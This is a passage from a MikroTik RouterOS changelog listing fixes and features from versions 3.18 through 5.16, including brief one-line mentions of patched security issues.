*) webfig - fixed skins when hiding first tab may make other tabs inaccessible;
*) winbox - fixed packet raw data view in packet sniffer;
*) winbox - fixed problem when router could be DoS attacked through winbox port;
*) ports - add option "/port firmware ignore-directip-modem"
    which will ignore modems ip interface
    and modem's serial ports will be made accessible to users;
*) ipv6 pool - allow pools with prefix equal to prefix length;
*) ping times improved on Nv2 high data rate wireless links;
*) tool email - added starttls option;
*) snmp - allow multiple ip ranges for each community;
*) serial console - added channel support;

What's new in 5.16 (2012-May-09 17:23):

*) webfig - fixed problem when new item addition to status page in design skin mode
   did not work;
*) add pw-type option for BGP VPLS;
*) fixed mac telnet - sometimes did not work if more than one mac level path
    to destination;
*) user - fixed problem when adding new users from console it's password was not set;
*) reset packet mark when encapsulating/decapsulating from eoip,ipip,gre,eoipv6,ipipv6,gre6 tunnels

What's new in 5.15 (2012-Apr-20 13:11):

*) ssh - added option "/ip ssh always-allow-password-login" which will allow
    password based login for users using public key;
*) snmp - moved disk oids shown in console from "/system resoure" to "/store disk";
*) certificate manager - added PKCS#8 support for key import;
*) lte - support for modems which utilize sierra_net driver with product ID 0x68a3,
    serial interface is no longer accesable for those modems;
*) quickset - added AP mode;
*) smb - fixed authorization problems, shares should now be browsable;
*) dhcp client - revert NTP settings on dhcp client disable;
*) dhcp server - use DNS server from DHCP client (broken in v5.13);
*) sstp - made it working on Pentium 4 again;
*) added support for usb forwarding over tcp;
*) webfig - fixed uptime column in hotspot active users list (and other places as well) ;
*) webfig - hide design skin button if user does not have
   sensitive & policy permissions;
*) webfig - do not allow to upload/download files
   without write/read & ftp permisions;
*) webfig - fixed blank page when logout, undo, redo, hide-menu or safe-mode were hidden in skin,
*) winbox - show connection tracking max entries properly;
*) winbox - make interface name sorting more stable;
*) winbox - do not reset user password when changing it's properties;
*) rb1200 ether6,ether7,ether8 did not support big packets when linked at 10/100Mbps;

What's new in 5.14 (2012-Feb-22 12:04):

*) winbox - fixed problem when changing main winbox window size and some of the inner windows 
   become hidden;
*) backup - backup file creation failed if router identity name had / in it;
*) wireless - improved nv2 link stability to reduce control frame timeouts,
    only AP requires update;
*) fixed rare configuration retention problems on RB1100AHx2;
*) certificate manager - fixed building certificate trust chain which caused
    certificate validation problems for some programs (VPN, SSTP etc)
    when downgrading from this version to older version please run
    "/certificate reset-certificate-cache" to maintain correct trust chain;

What's new in 5.13 (2012-Feb-14 08:18):

*) firewall - to-address can be specified as ip address with mask in addition to
    ip range;
*) traffic-generator - fix crash on multicore systems;
*) smb - fixes and improvements;
*) sstp - added RC4 cipher support to fix interoperability issues
    introduced in MS KB2585542 security update. from now on RC4 is the
    preferred cipher and AES will be used only if peer does not advertise RC4;
*) dhcp client - revert DNS settings on dhcp client disable;
*) quickset - country & channel-width can now be specified;
*) quickset - added support for configuring pppoe client on wireless interface;
*) bridge - fixed problem where arp reply-only or disabled mode didn't work and
   disabled bridge interfaces didn't have X flag;
*) webfig - fixed problem where none of table entries were shown if table filter
   was left to 'all';
*) webfig - show login page if autologin fails;
*) user manager - don't store backups in active store, always use path relative to /;

What's new in 5.12 (2012-Jan-19 14:31):

*) console - allow to specify blank interval on x86 screens;
*) console - changed 'password' command, now can be used from scripts and api;
*) winbox - reorganized window layout to match console better;
*) ssh - fixed interoperability problem with psftp based clients;
*) implemented simple SMB (windows file sharing) server;
*) fixed ovpn-client - client stopped working if it was enabled/disabled at wrong time;
*) fixed ipv6 - ipv6 neighbor discovery stopped working when
   interface arp setting wasn't set to enabled;
*) console - minor fixes and improvements;
*) console - added support for compact export;
*) hotspot - added login redirect through http status 302;
*) leds - added default configuration for R5SHPn wireless card;
*) ppp - fixed problem were remote-ipv6-prefix was not given to user if remote-ipv6-pool was 
   provided;
*) winbox, webfig - sort ethernet interfaces properly when more than 10 exist;
*) added QuickSet to RBSXT, RB411, RB711;
*) user manager - command to create and assign user profile from console;
*) added support for LTE modems (cdc ethernet type);
*) fix gre tunnels on x86 and other little endian machines;

What's new in 5.11 (2011-Dec-12 11:05):

*) hotspot - fixed https login (broken in v5.9);
*) eoip: swap tunnel id bytes to be compatible with previous versions;
*) eoip,gre: fix setting config

What's new in 5.10 (2011-Dec-09 11:49):

*) snmp - provide extended interface statistics when availabe;
*) dhcpv6 client - use link-scoped multicast address;
*) dhcp client - renew dhcp lease on ethernet link up event;
*) ipv6 gre tunnel added (/interface gre6) supports ip and ipv6 encapsulation;
*) ip gre tunnel supports ipv6 encapsulation;
*) allow setting bigger trafflow cache;
*) improved RB1200 stability when using ether9,ether10;
*) fixed RB1200 stability issues when using crypto hardware acceleration;

What's new in 5.9 (2011-Nov-29 14:32):

*) ssh - fix mempry leak when client uses public key authentication;
*) ppp - added support for new RADIUS attribute MT-Delegated-IPv6-Pool (#22);
*) ntp client - faster initial synchronization;
*) ppp - added support for dhcpv6 pd;
*) wireless - nv2 improvements for 11n cards;
*) hotspot - fixed login page to better handle big load;
*) wireless - change default rate-selection to advanced;
*) snmp - fix simple queue table;
*) webfig - fixed problem were users wihtout sensitive permission could download
   senstive files (like backups);
*) webfig - fixed problem were table filters did not work allways as expected;
*) metarouter - fixed problem where local routeros instances did not boot;
*) dhcpv6 - client and server moved to respective /ipv6 dhcp- entry;
*) dhcpv6 server - changed how bindings are defined, users should add
    missing static binding information after upgrade;
*) sms - send sms now uses channel from config if it's not specified in the command;

What's new in 5.8 (2011-Nov-01 10:14):

*) snmp - fixed problem where some rows were missed
   in a few tables when walking them;
*) ipv6 - added support for router address assignment from ipv6 pools;
*) routerboard - fix RB400/RB700 bootloader upgrade problem
*) radius - respond to CoA & Disconnect requests with the same ip address
   it was received to;
*) improved webfig look;
*) webfig - do not allow to show secret passwords if user does not have
   sensitive permission;
*) webfig - allow to customize all item names in skins;
*) updated timezone information;
*) lcd - added support for new ax93304 model and nexcom LCDs;
*) ppp - added support for ipv6 pools;
*) ppp - added support for Framed-IPv6-Pool radius attribute;
*) dhcp client - fix high CPU usage when interface is disabled;
*) snmp - trap interface filter, multiple trap targets;
*) dhcp - added server support for IPv6 prefix delegation from /ipv6 pool,
        client support is also added;
*) ipsec - support authorization with raw RSA keys;
*) added ipv6 prefix pools;
*) winbox - now copied item in ordered list is added right after it's original;
*) pcq - fixed possible crash;

What's new in 5.7 (2011-Sep-14 10:54):

*) ovpn client - fixed crash when user name or password together
   were longer than 11 symbols;
*) sstp client - added an option to skip
    server address verification from certificate;
*) fixed problem - router crashed sometimes when using USB modem;
*) userman - show overall totals, show user totals if user has more
   than one entry;
*) lcd - retrieving '/system lcd page' configuration did not work with
    hundreds of interfaces;
*) webfig - added ability to reorder fields in skins;
*) webfig - added ability to add/remove new tabs & separators in skins;
*) webfig - added ability to add any field to special status page;
*) webfig - fixed problem when user sometimes got logged out with message
   "internal server error";
*) webfig - logout didn't log user out from router;
*) webfig - added System/Password for changing user's own password;
*) system reset-configuration - if keep-users is specified ssh user keys are
   preserved as well;
*) ipsec - new exchange mode (main-l2tp) for l2tp tunnel users to allow
    FQDN as a peer ID with preshared key authorization in main mode;
*) ssh - fix possible server crash when connection is interrupted;
*) improved ipv4 forwarding performance on all boards with simple configuration
    by up to 30%;
*) add passthrough setting to change-dscp, change-ttl, change-mss,
    strip-ipv4-options, change-hop-limit mangle targets;
*) ipsec - fixed problem of RB1200 rebooting when large amount of UDP traffic is 
   sent through IPsec;
*) sniffer - added more useful packet filtering options, also available as quick
    mode command parameters;

What's new in 5.6 (2011-Aug-02 14:45):

*) ipsec - fix a problem which could silently remove a manual policy
    from the kernel if the peer configuration has 'generate-policy' set to 'yes'
    and if the policy matches with the traffic selector of a SA being removed
    on the responder side, also fix a problem that some generated policies
    may stay in kernel after relevant SA was removed;
*) profiler - correctly show idle task on RB1200;
*) webfig - fix dual nstreme interface setting lists;
*) webfig - fix Wireless Access/Connect List editing;
*) webfig - fix bitrate presentation in simple queues (show 1.5M as 1500k);
*) fixed micro-sd access on RB400 not to stop everything else;
*) sstp - when server certificate verification is enabled for sstp client,
    it will additionally compare IP addresses found in certificate's
    subjectAltName and subject CN to the real address, DNS names are ignored;
*) tftp - optional block counter roll-over support;
*) hotspot - fixed possible crash in case of multiple Radius CoA requests;
*) userman - speedup user deletion with big log size,
    note that first userman startup after this update
    may take few minutes if the log size is in hundreds of MB;
*) mpls - added support for enabling/disabling control word usage for
   BGP based VPLS tunnels (both - Cisco and RFC 4761 based);
*) mpls - added support for auto-discovery of VPLS NLRI encoding method
   for Cisco BGP based VPLS tunnels;
*) winbox - sometimes after disconnecting, winbox could not connect back;
*) gre,ipip tunnels - new dscp parameter (0..63 or inherit);
*) ping - new dscp parameter;

What's new in 5.6:

*) bgp - allow parallel operation of RFC4761 "l2vpn" and
    draft-ietf-l2vpn-signaling "l2vpn-cisco" BGP VPLS variants inside
    single peering session.
*) console - ":resolve" command now returns IPv6 address for domain names
    that have only IPv6 address records;
*) snmp - provide ups alarms for bad or low battery or for ups overload;
*) route - fixed SNMP getnext queries, were failing to find next
    prefix in the OID order;

What's new in 5.5 (2011-Jun-20 14:43):

*) console - resolved problem that appeared in version 5.4. it caused
    'sup-output' command to crash console on systems with many ethernet
    interfaces or very long interface names.
*) serial console - do not automatically send login prompt to attached
   usb modem if no other serial port exists;
*) winbox - fixed scrolling in terminal window;
*) webfig - encrypt whole session even in non https mode;
*) do not show contents of skin files to users without
   'sensitive' permission;

What's new in 5.4 (2011-May-27 13:18):

*) webfig - do not try to open many windows
   if first open was blocked by browser;
*) RB4xx ether1 port flapping fixed;

What's new in 5.3 (2011-Apr-29 15:05):

*) snmp - fix table get next with partial row keys;
*) snmp - respond from correct source address when multiple exist;
*) snmp - fix possible interface disappearing when walking ipNetToMediaTable;
*) snmp - fix possible memory leak;
*) ipsec - flush SAs and inform peer when rebooting or shutting down;
*) openvpn - fixed crash;
*) implemented terminal in WebFig;
*) implemented Skin mode in WebFig;
*) added support for more Broadcom Tigon3 based ethernet cards;
*) winbox - fixed byte to KiB, MiB and GiB conversion
  (digit after decimal point could be a bit off);
*) console - align numbers right in tabular print output;
*) fixed RB450G, RB750G switch chip slow ethernet problem;
*) fix vlan disable not taking effect;
*) userman - fix Authorize.Net payment bypass;
*) userman - added profile option to overwrite shared users option
    in user settings when profile is activated;
*) userman - fix db backup if it's size exceeds 2G;
*) wireless - merged ht-extension-channels in to channel-width;

What's new in 5.2 (2011-Apr-21 09:36):

*) fixed webfig;
*) console - fixed problem with supout file generation and export that
    appeared in version 5.1, it was causing console to enter busy loop
    on some boards;
*) ssh client - added source address and remote command options;
*) user manager - added /tool usermanager profile;

What's new in 5.1 (2011-Apr-08 12:55):

*) ipsec - fix SA lifetime display when timezone offset does not equal 0;
*) ipsec - now default DPD interval is 2 min for new configurations;
*) webfig - make bandwidth-test work;
*) fixed problem - wireless package got disabled after upgrading from v4;
*) sstp - fix problems on multicore systems;

What's new in 5.0 (2011-Mar-31 11:33):

*) route - fixed cause of crashes when handling multipath routes;
*) route - fixed limit on maximum active IPv6 route count,
   was causing issues with more than 2000 active routes;
*) ipsec - added command kill-connections under remote-peers;
*) ipsec - fix responder side phase2 negotiation problem
    which prevented more than one Windows7 host to initiate SA;
*) fixed vrrp - interface was invalid after undoing remove;
*) winbox - added more detailed /interface ethernet stats;
*) winbox - added ability to send e-mail;
*) winbox - added missing 'set-metric' parameter
   in 'Routing/Prefix List';
*) wireless - 802.11 dynamic distance fix;
*) fixed problem - packages could not be uninstalled if disk was full;
*) fixed problem - some of the RouterBOARDS did not reboot properly sometimes;
*) fixed problem - VLANs on bridge interface did not work;
*) ssh - client supports public key authentication;

What's new in 4.17 (2011-Mar-02 10:53):

*) fixed occasional print command stalling when lots of items;
*) fixed RB1100 ether11,12,13 and RB800 ether3 resetting problem;
*) implemented usb power-reset command on RB SXT 5HnD;
*) wireless-nv2 package now includes the same fixes as RouterOS v5rc11;

What's new in 4.16 (2010-Dec-20 10:21):

*) fixed problem - could not update license for
   old style 7 digit software-id's;

What's new in 4.15 (2010-Dec-13 12:37):

*) upgraded broken RB1000 bootloader which was included with v4.14;

What's new in 4.14 (2010-Dec-10 12:07):

*) radius - fixed Disconnect and CoA response signature generation;
*) radius - do not include NAS-Identifier & NAS-IP-Address in
   Disconnect and CoA responses;
*) added hotspot html variable "host-ip";
*) wireless nv2 - fixed station-wds mode multicast problem;
*) wireless nv2 - fixed occasional encrypted link stalls;

What's new in 4.13 (2010-Nov-01 14:48):

*) added USB power reset feature;
*) added support for nv2 in wireless-nv2 package;

What's new in 4.12 (2010-Oct-25 10:35):

*) added support for RB493G;

What's new in 4.11 (2010-Jul-26 10:16):

*) changed "wireless registration table entry count" snmp oid to 1.3.6.1.4.1.14988.1.1.1.4.0;
*) fix 5&10MHz channel support for 11n cards;

What's new in 4.10 (2010-May-28 13:59):

*) added support for ethernet switch configuration in WinBox;
*) allow to configure 11n wireless rate tx powers in WinBox;
*) dhcp server - show non-printable option 82 agent-circuit-id and
   agent-remote-id values in hexadecimal notation also in winbox;
*) api - fixed '/ip/route/print', was not showing '.id' values;
*) console - fixed printing of OID values;
*) lcd - added support for AX89063

What's new in 4.9:

*) fixed problem - some of the bridge ports stayed invalid after reboot;
*) console - added '/port remote-access export' command;

What's new in 4.8:

*) added support for second serial port on RB800/RB1100;
*) fixed problem - WinBox crashed while opening VAP interface;
*) dhcp server - fixed possible inactive dhcp server in case of many
   dhcp leases with address-pool enabled (broken in v4.7);
*) dhcp server - show non-printable option 82 agent-circuit-id and
   agent-remote-id values in hexadecimal notation
   (in the same way as client-id is shown);
*) api - can supply password to '/system/upgrade/upgrade-package-source/add';
*) console - fixed bug that caused "cannot set ..." error when using
    some properties in 'find' commands;
*) api - 'print' command was not showing values of some properties
    such as 'servers' in "/ip/dns";
*) show old software id in export file header;

What's new in 4.7:

*) fixed problem - wireless packet bridging with nstreme enabled
   sometimes was very slow on RB1xx, RB5xx and RB4xx;
*) fixed problem - ipv6 traffic was not bridged if ipv6 package was not enabled;
*) '/user active' now lists type of api connections as 'api'  
*) fixed getting interface stats in dude
*) fixed metarouter stability problem on RB400s & RB750s;
*) fixed metarouter - it didn't work on RB1000 with 2Gb;
*) fixed metarouter - it locked up on RB800;
*) fixed problem - SFQ queues did not work on interfaces (wireless) if none
   of simple or tree queues were added;
*) fixed RB800 temperature;
*) silentboot feature updated;
*) multicast - fixed possible crash during PIM startup;
*) ospf - changed "/routing ospf route" to show type 2 metric instead of
    internal metric for type 2 external routes;
*) report platform name in "/sysrem resource";
*) fixed problem - vlans were not working on RB750 ether1;
*) fixed mac address handling on RB750, some specific arp requests did not work;
*) more than two dns servers allowed in /ip dns;
*) sniffer and torch could process packet from other interfaces;
*) dns cache rotates order of records in reply messages;
*) ospf - fixed DR and BDR election;

What's new in 4.6:

*) only accept dotted decimal notation for IP addresses. Use of numbers
    with leading zero, numbers larger than 255 and non-decimal numbers
    is not accepted (but still can ommit third or second and third numbers,
    if they are zero);
*) email - user must enable tls explicitly
*) remove limit on number of multicast enabled interfaces, maximum was 32;
*) dhcp server - show last-seen time for leases;
*) dhcp server - do not create busy lease if client declines all IP addresses;
*) fixed - when closing winbox terminal window with active serial-terminal
    console command, serial port sometimes was left in acquired state;

What's new in 4.5:

*) ipsec - added blowfish, twofish, and camellia encryption algorithms;
*) fixed static route removing;
*) fixed DHCP client compatibility with some DHCP servers;
*) added static multi-cast route support;
*) fixed temperature monitor on RB800 and RB450G;
*) user manager - payment bug fix - now able to buy 
   credits without extend price specified;

What's new in 4.4:

*) snmp - fixed snmp version three;
*) snmp - fixed vlan interface speed;
*) hotspot - fixed radius variables in hotspot html pages;
*) removed support for xen;
*) routing - added support for BFD protocol;
*) fixed problem - MetaROUTER sometimes froze on RB4xx;
*) fixed OSPFv3 on bridge interfaces;

What's new in 4.3:

*) kvm - vnc support, booting from cdrom image
*) API - fixed possible crash when running concurrent commands;
*) console - fixed logging commands: 'warning', 'error' and 'debug' were
    all using 'info' topic;
*) bgp - added routing-table configuration option for instances;
*) bgp - added 'as-override' and 'passive' configuration options for peers;
*) bgp - added support for Site of Origin extended communities;
*) bgp - fixed some network issues;
*) ospf - fixed problem: when last neighbor on multi-access interface disappeared,
   incorrect RouterLSA was generated on designated router;
*) metarouter - allow to specify metarouter's memory size when importing image;
*) firewall - added 'routing-table' matcher;
*) fixed problem - e1000 driver did not work in virtual machines;

What's new in 4.2:

*) fixed problem - RB450G ethernet did not work if one of the ports was disabled;
*) fixed ethernet of RB433 with switch chip IP175D;
*) fixed route attribute problem;
*) fixed route next-hops falling under multiple connected routes;

What's new in 4.1:

*) fixed problem - RB750 (clocked at 300MHz) Ethernet did not work;
*) fixed problem - routes on some interfaces (like VLAN) were not activated;
*) ppp, gps, sms, serial terminal - allow use of different channels
    on same port across multiple programs simultaneous
*) dhcp server - added support for dynamic address-list entries;
*) hotspot - added support for dynamic address-list entries;
*) hotspot - fixed redirect after login in case if client gets new IP address
   (problem introduced in 3.28);

What's new in 4.0:

*) IT87XX hardware monitoring sensor support;
*) kvm allows to choose emulated nic model;
*) hotspot - fixed redirect after login in case if client gets new IP address
   (problem introduced in 3.28);
*) hotspot - fixed redirect after login in case if client gets new IP address;
*) console - commands like 'monitor', 'torch' and others that periodically
    refresh information sometimes failed to work when started from
    the scheduler;
*) console - scheduled scripts no longer require 'test' policy to run;
*) console - fix issues with scripts that contain lines with trailing spaces;
*) console - add back compatibility with old scripts that use space instead
    of '=' to separate argument name and value;
*) console - following fixes:
    - accept item numbers when prompted by command to specify item;
    - argument names without '=' were matched even when expecting unnamed
        value; this broke code such as:
           :foreach i in=1,2,3 do {}
       here 'i' was matched as argument name "in";
    - 'tab' key did not automatically append '=' after complete argument
        names;    

What's new in 4.0rc1:

*) console - removed support for Lua (will be reintroduced later);
*) incorporated all the bug fixes since v3.30;
*) port remote-access - added 'log-file' property. If value is a non-empty
    string, then all data that is read from the port is appended to a file
    with that name, regardless of the active remote connection;
*) console - removed '/user' from the output of top level '/export' command,
    still can be exported by '/user export';

What's new in 4.0beta4:

*) routing - changed BGP network and default-originate behavior;
*) web proxy - allow to edit error page;
*) console - terminal window size change now does not trigger full terminal
   reset;
*) mesh protocol - improved loop prevention (becomes incompatible with earlier versions);

*) incorporated all the bug fixes since v3.27;

What's new in 4.0beta3:

*) added support for 802.11n atheros based wireless cards;
*) added ability to run other OSs in MetaROUTERs;
*) console: Lua scripting language. http://wiki.mikrotik.com/wiki/Lua
*) console: added nstreme-dual OIDs;
*) incorporated all the bug fixes since v3.23;

What's new in 4.0beta2:

*) console: added 'without-paging' argument to 'monitor' commands;
*) console: now 'without-paging' and 'interval' arguments in of 'print'
    commands work together. Printing can be stopped by pressing 'q' or
    ctrl-c, any other key triggers printing;
*) incorporated all the bug fixes since v3.22;
*) fixed TFTP server logging;
*) fixed problem - "/system upgrade" did not show proper package
   architecture and was unable to fetch new packages;

What's new in 4.0beta1:

*) added support for MetaROUTERs;
*) all test packages are regular ones;
*) console - can mix named and unnamed arguments, can use names for unnamed
     argument values. For example all of the following commands are
     accepted now:
       /ping 10.11.12.13 count=4
       /ping address=10.11.12.13 count=4
       /ping count=4 10.11.12.13

What's new in 3.30:

*) added connection-rate matcher;
*) receiving too large frame (>1540 bytes) does not hang ether1 on RB4xx;
*) fixed ping - value of 'src-address' was ignored since 3.23;
*) api - limited maximum allowed word length to 65536;
*) fixed IPv6 Router Solicitation message handling;
*) special-login - port could remain used by 'special-login' even after
    user logged out. fixed;
*) bonding in active-backup mode and arp link monitoring works when no switch
   between endpoints;
*) routing, routing-test - fixed route redistribution crash;
*) ups - show voltage in .01V units;
*) console - 'torch' and 'wireless scan' commands have new argument
    'duration' that approximately limits running time of the command;
*) api - 'torch' and 'wireless scan' commands now return same values
    in '!re' responses as in console (before they didn't return
    anything), '.proplist' is also correctly handled;
*) fixed problem - sometimes netinstall did not show new software id;
*) added support for BGP aggregates from IGP routes;
*) user manager - no backup for deleted logs;

What's new in 3.29:

*) fixed problem - local bandwith test could take all the CPU to itself
   not allowing other tasks to run;

What's new in 3.28:

*) fixed hotspot problem - on multi-processor systems it was not possible
   to set IP address for hotspot client during login - deadlock did happen;
*) fixed hotspot problem - it was possible for hotspot to spike CPU usage
   to 100% and not to accept new logins during that time;
*) added ethernet broadcast support for WakeOnLan tool;
*) api - value of 'comment' property was only returned from 'system' package
   programs;
*) to see actual values of sensitive configuration parameters (such as
   passwords), user needs to possess policy 'sensitive';
*) avoid problems with western time zones by always advancing clock on
   startup past january 2st 1970, 00:00:00 UTC;
*) added 'run-after-reset' argument to 'reset-configuration' command. It
   allows to specify name of console script file to run after the
   configuration reset reboots the router. When this argument is used any
   other default configuration scripts are ignored.
*) route - fixed a crash;
*) routing-test - fixed OSPF routing table calculation;
*) send keepalives every 30s (was 3 min) on ppp clients - make some 3G connections
   more stable;
*) routing-test - changed BGP network and default-originate behaviour;
*) web proxy - allow to edit error page;
*) console - terminal window size change now does not trigger full terminal
   reset;
*) mesh protocol - improved loop prevention (becomes incompatible with earlier versions);

What's new in 3.27:

*) fixed memory leak in DNS;

What's new in 3.26:

*) fixed hotspot problem - deadlock was possible on multi-processor routers;
*) fixed problem - it was possible for RouterBOARD to loose configuration
   after upgrade to RouterOS version 3.25;
*) added MetaROUTER support on RB1000;
*) using pptp and eoip tunnels simultaneously could crash router;
*) api - "comment" property was not accessible, fixed;
*) console, api - fixed handling of decimal fractions in time interval values;
*) bonding interfaces could sometimes disappear after reboot;
*) changed mesh protocol to send routing packets to broadcast address;
*) automaticly add ppp client interface when GPRS/3G modem is plugged in;
*) added simple/advanced mode to ppp client in WinBox;
*) added support for Huawei E1550 UMTS/HSDPA modem;
*) added support for Cricket Wireless A600 modem;
*) added support for yet another Globetrotter HSDPA modem;
*) added support for Sony-Ericson MD300 modem;
*) added support for ZTE MF626 & MF627 modems;

What's new in 3.25:

*) fixed problems with files under MetaROUTERs;
*) made WinBox work better on smaller screens;
*) made WinBox to not bring down BGP & OSPF when BGP window was opened;
*) WinBox menu is better organized, all sub-menus are sorted;
*) fixed WinBox problem - /128 IPv6 addresses could not be entered
   where network address was expected;
*) added l2mtu interface parameter with ability to configure for
   interfaces that support it;
*) RB1xx ether1 did not work properly in switch mode;
*) api - do not accept truncated property names;
*) api - closed sessions were not removed from the '/user active' list;
*) routing, routing-test - fixed a BGP crash;
*) routing-test - deleted routes were sometimes left displayed in Winbox;
*) routing-test - fixed BGP interoperability issue with old Ciscos;
*) routing-test - added remove-private-as BGP peer config option;
*) added few more variables to hotspot html pages:
	bytes-total, bytes-total-nice, packets-total
*) bandwidth-test supports testing over multiple tcp connections (default 20);
*) graphing - HTML page refresh-interval configurable in console;
*) user manager - IP pool added to user batch-add form;

What's new in 3.24:

*) added ability to run non RouterOS in MetaROUTER;
*) improved address-list and layer7 firewall feature support for smp systems;
*) special-login items can now be disabled;
*) fixed special-login to update used-by property of port;
*) fixed USB UPS monitoring on RB433UAH;
*) console - 'print' command reuses assigned item numbers;
*) fixed issue with Cisco BGP VPLS when used between 2 RouterOS devices;
*) console - 'print' commands have new option 'follow-only' that continuously
    shows changes like the 'follow' option, but does not print all items
    at the beginning;
*) api - 'follow' and 'follow-only' options of 'print' commands now work,
    '.dead' property is reported for deleted items;
*) api - 'listen' command now is alias for 'print' with 'follow-only'
    opriont set;
*) api - several commands running in parallel could produce intermixed
    output, fixed;
*) console and api - fixed problem that caused property values sometimes to
    incorrectly have value '(unknown)', this could happen when running
    several console or api commands at once;
*) fixed BGP VPLS crash when site-id > 15 used somewhere in network;
*) changed BGP AS path number output format to ASPLAIN; 
*) console - new scheduler tasks use trimmed effective user permissions as the
    default value of policy, previously default value was "read,write,test";
*) added ttl matcher to ipv4 firewall;
*) improved dns cache not to allow other RRs in statically configured domains;
*) fixed vlan on bonding;
*) fixed bonding modes balance-alb and balance-tlb;
*) added per-connection-classifier matcher to firewall;
*) fixed wireless Hw. Fragmentation Threshold in WinBox;
*) user manager - added option to specify custom Return URL
   for Authorize.Net payments;
*) user manager - write logs to syslog topic manager,account;
*) routing-test - support for per-VRF BGP instance redistribute settings;
*) routing-test - speed up BGP route processing;
*) routing-test - added routing-table configuration to RIP;

What's new in 3.23:

*) added WakeOnLan tool
*) fixed installation on fresh disks or VMs;
*) add 802.1ad Service Tag support for VLAN;
*) wireless - fix for RTS/CTS when used together with dynamic ACK timeout;
*) serial ports are now grouped per USB device;
*) added gsm info command to ppp-client;
*) added URL support to fetch tool;
*) added dial-on-demand mode to PPTP & L2TP clients;
*) ssh - now non-interactive console commands can reference variables;
*) fixed TFTP server logging;
*) fixed problem - "/system upgrade" (autoupgrade) did not show proper package
   architecture and was unable to fetch new packages;
*) fixed bug - hotspot 'walled garden ip' rules did not work on some boards
   after reboot;
*) added '/interface print stats' command;
*) improved support for OSPF as PE-CE routing protocol;
*) added OSPF sham links;
*) fixed a bug in set-bgp-prepend-path routing filter;
*) fixed some MPLS TE reoptimize bugs;
*) added MPLS TE bandwidth management features;
*) netwatch - ignore items with interval 0s, this value was causing
    netwatch to fail;
*) routing-test - added new type of gateway argument: ip address together with interface;
*) api - 'disabled' property was not available from api since 3.21, fixed;
*) api - added support for retrieving OID values;
*) api - removed special behaviour of 'find' command under API. Use
    'print' command with queries instead of 'find'. This change fixes
    scripts that are started from API and contain 'find' command.
*) console - removed support for octal numbers, now string of digits with
    a leading zero is interpreted as decimal number;
*) console - added binary ~ operator that matches value against
    POSIX extended regular expression;
*) console now accepts decimal numbers with k/K M G T P suffixes for
     values of some properties;
*) console - fixed export problems:
    if long line is wrapped just before space charater, the space character
      has to be escaped, otherwise it is lost;
    errors during export generated a comment line that was incorrectly enclosed
      in quotes;
*) console - added binary ~ operator that matches value against
    POSIX extended regular expression;
*) scheduler - added owner and policy properties; all existing
    scheduler entries will get owner name "*sched" and policy
    read,write,test;
*) routing-test - allow to specify that route gateway is in the main routing table;
*) added route cache statistics;
*) fixed mesh protocol;
*) graphing - fixed IP address mask display issue for low endian architectures;

What's new in 3.22:

*) added advanced switch features for RB450G;
*) added support for MetaROUTER on RB450G;
*) added support for adding physical interfaces to Metarouters;
*) added set-bgp-prepend-path action to routing filters;
*) added WinBox OSPFv3 support to routing-test package;
*) added WinBox IPv6 routes support to routing-test package;
*) console - added 'hide-sensitive' option to the export command;
*) user manager - fixed customer remove interface bug;
*) fixed Cisco BGP VPLS autodiscovery in mpls-test package;
*) fixed LDP to not disconnect on unknown capabilities of remote
   peer (should help establish LDP session with Junos);
*) fixed ethernet port name reordering on RB493;
*) bonding mode balance-alb now works on RB1xx, RB4xx, RB616, RB600, RB750,
   RB1000;
*) added '/interface ethernet print stats' command for RB450G and RB750;
*) fixed CSPF in routing-test to properly interpret link bandwidth;
*) added support for C-motech CNU-680 CDMA 1x EV-DO 450Mhz USB Modem;

What's new in 3.21:

*) backported MetaROUTER support for RB4xx from v4;
*) added WinBox MPLS & VPLS support mpls-test package;
*) added WinBox BGP support to routing-test package;
*) api - added query support for 'print' command;
*) added support for bsd-syslog;
*) added TFTP server;
*) added authorization and TLS support to email tool;
*) added pppoe-scanner;
*) added tftp protocol support to fetch tool;
*) fixed ipsec policy priority to work as documented;
*) fixed BGP route selection in routing package;
*) allow to use IPsec aggressive mode with pre-shared keys;
*) fixed some problems in mesh protocol;
*) fixed https proxying with parent proxy;
*) fixed Prism shared IRQ issue;
*) fixed multiple MPLS/VPLS bugs in mpls-test;
*) fixed boot problems on some RB1000s;
*) added /interface mesh traceroute command;
*) fixed web proxy source address selection;
*) fixed pcq queue - pcq sometimes could get through more traffic
   than specified in max-limit;

What's new in 3.20:

*) added support for IPsec hardware acceleration on RB1000,
   increases IPsec SHA1-3DES encryption from 45Mbps to 500Mbps
   and SHA1-AES from 79Mbps to 500Mbps;
*) fixed IPv6 on RB1xx and RB5xx;
*) added support for ZTE MY 39, CDMA EVDO USB card;
*) added clear-df action to firewall;
*) fixed bug - sometimes netinstall could fail to install RouterBOARD
   with "ERROR: could not format partitions";
*) fixed PCQ bug - pcq-rate < 70000 did not work correctly (broken in 3.17);
*) added radius-mac-format setting in hotspot server profile;
*) allow to use ip firewall for encapsulated PPPoE packets;
*) graphing - fixed 10Gbit card bug;


What's new in 3.19:

*) fixed problem - web proxy used up all router memory
   if unlimited ram caching was enabled;
*) fixed problem - some log topics got swapped in configuration;
*) reduced maximum supported memory for RB1000 to 1.5Gb (was 1.75Gb);
*) interface mesh was not working in 3.18, fixed;
*) fixed Prism crash;
*) fixed VPLS interface related crash in mpls-test;
*) allow to enter range in BGP instance confederation peers;
*) console - fixed '/system backup save' command, name argument is
    optional, and backup file name is automatically generated if empty;
*) sped up IPv6 forwarding on RB4xx, RB1xx and RB5xx;
*) fixed BGP route selection in routing-test;
*) fixed dhcp server to update agent-circuit-id and agent-remote-id for lease
   whenever it changes;

What's new in 3.18:

*) IPv6 address auto-configuration: added recursive DNS server option;
*) fixed problem - sometimes firewall did not work after reboot on RB1xx;
*) do not send IPv6 packets over PPTP, L2TP or PPPoE - could confuse some
   servers or clients;
*) allow queues to have all traffic, not only ip (for example vpn);
*) added ability to specify dns name in bandwidth test in WinBox;
*) fixed problem - sometimes RB1xx (and RB4xx) could not start up or startup was very long;
*) improved ipv6 sniffing;
*) improve torch and sniffer behavior under high load;
*) improved queue statistics;
*) fix xen make-routeros-image command;
*) fix potential wireless crash under load when negotiating encryption;
*) fix several MPLS issues in mpls-test;
*) fixed support for Novatel Wireless Ovation MC950D HSUPA;
*) fixed some bugs in routing-test OSPF;
*) added support for D-Link DUB-E100 USB Ethernet adapter;
*) fixed user-manager database rebuild command to succeed in case of
   malformed database disk image;
*) sms - added descriptions for error codes;
*) sms - added automatic 'smsc' (service centre address) value detection,
     to work around first time error when sending SMS without specifying
     an 'smsc' value;
